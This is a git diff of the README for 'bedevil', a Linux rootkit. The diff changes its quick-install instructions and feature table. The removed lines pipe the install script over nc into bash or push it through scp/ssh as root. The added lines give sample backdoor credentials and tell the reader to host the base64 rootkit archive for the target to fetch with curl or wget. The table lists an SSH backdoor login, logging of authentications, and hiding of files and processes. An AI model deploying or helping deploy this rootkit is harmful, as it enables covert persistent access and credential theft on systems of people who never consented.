@@ -75,19 +75,19 @@
  * At the stage this script is currently in, utilising the dynamic linker patch isn't as straight forward as it should/I'd like it to be.
 
 ### Example
- * `BD_UNAME=[...] BD_PWD=[...] [...] ./bedevil.sh -vdz`
- * Upload resulting `*.so.inc.b64` somewhere.
+ * `BD_UNAME=sexand BD_PWD=lovegod ./bedevil.sh -vzd`
+ * Host resulting `*.so.inc.b64` somewhere you can access from the target.
+ * The box must be able to use `curl`/`wget` to download it.
  * Change `B64TARGZ_LOCATION` accordingly.
-   * `scp auto.sh root@host:/tmp/ && ssh root@host 'bash /tmp/auto.sh'`
-   * Or... with nc.
-     * `# nc -vlp 1234 | bash`
-     * `$ cat /tmp/auto.sh | nc h.o.s.t 1234`
- * Rootkit will then be installed as per usual, just in a fraction of the time compared to before.
-   * Something worth noting is that `patch_sshdconfig` doesn't exist here.
-   * Whereas it normally would, and be executed, with `bedevil.sh`.
-   * Small price to pay.
-   * If this proves to be problematic, you can do it yourself.
-   * See `etc/postinstall.sh` for this function.
+
+<img src=https://i.imgur.com/QPCxDRP.png/>
+<img src=https://i.imgur.com/jzmvsiM.png/>
+
+ * Something worth noting is that `patch_sshdconfig` doesn't exist here.
+ * Whereas it normally would, and be executed, with `bedevil.sh`.
+ * Small price to pay.
+ * If this proves to be problematic, you can do it yourself.
+ * See `etc/postinstall.sh` for this function.
 
 <hr>
 
@@ -101,8 +101,6 @@
 | Toggle           | Info                                                         | Default status | Dependency | Ignored(?) |
 | :-------------   | :----------------------------------------------------------- | :------------- | :--------- | :--------- |
 | `USE_PAM_BD`     | allows interactive login as a backdoor user via ssh          | on            | libpam     | no         |
-| `USE_ACCEPT_BD`  | allows backdoor connection via running (& infected) services | off            | -          | no         |
-| `ACCEPT_USE_SSL` | to use SSL or not for the accept hook backdoor               | off            | libssl     | no         |
 | `LOG_LOCAL_AUTH` | log successful user authentications on the box                   | off            | libpam     | no         |
 | `HIDE_SELF`      | hides files and processes based on rootkit magic GID         | on             | -          | yes        |
 | `FORGE_MAPS`     | hides rootkit presence from process map files                | on             | -          | yes        |
